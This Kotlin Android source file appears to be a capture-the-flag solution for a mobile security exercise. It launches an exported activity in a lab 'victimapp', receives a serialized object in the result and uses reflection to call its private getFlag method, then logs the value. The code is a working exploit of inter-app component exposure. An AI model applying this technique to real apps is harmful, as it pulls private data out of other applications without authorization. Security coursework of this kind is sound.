package com.example.serialintent

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.result.ActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import com.example.victimapp.FlagContainer
import java.io.Serializable

class MainActivity : ComponentActivity() {

    //Avoid using getSerializableExtra
    inline fun <reified T : Serializable> Bundle.serializable(key: String): T? = when {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU -> getSerializable(key, T::class.java)
        else -> @Suppress("DEPRECATION") getSerializable(key) as? T
    }

    inline fun <reified T : Serializable> Intent.serializable(key: String): T? = when {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU -> getSerializableExtra(key, T::class.java)
        else -> @Suppress("DEPRECATION") getSerializableExtra(key) as? T
    }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Register for activity result
        val launchActivity = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result: ActivityResult ->
            if (result.resultCode == Activity.RESULT_OK) {
                val data: Intent? = result.data
                handleFlag(data)
            }
        }

        // Create an intent with the victim app's package name and SerialActivity component
        val componentName = ComponentName("com.example.victimapp", "com.example.victimapp.SerialActivity")
        val intent = Intent()
        intent.component = componentName

        // Launch the intent
        launchActivity.launch(intent)
    }



    private fun handleFlag(data: Intent?) {
        if (data != null) {
            // Extract the FlagContainer using reflection
            Log.e("MOBIOTSEC", "Extracting flag")

            val flagContainer = data.serializable<FlagContainer>("flag")
            if (flagContainer != null) {
                try {
                    val getFlagMethod = flagContainer.javaClass.getDeclaredMethod("getFlag")
                    getFlagMethod.isAccessible = true
                    val flagValue = getFlagMethod.invoke(flagContainer) as String
                    // Log the flag
                    Log.i("MOBIOTSEC", "Reversed Flag: $flagValue")
                } catch (e: Exception) {
                    Log.e("MOBIOTSEC", "Error extracting flag: ${e.message}")
                }
            } else {
                Log.e("MOBIOTSEC", "FlagContainer is null")
            }
        } else {
            Log.i("MOBIOTSEC", "Flag is null")
        }
    }
}
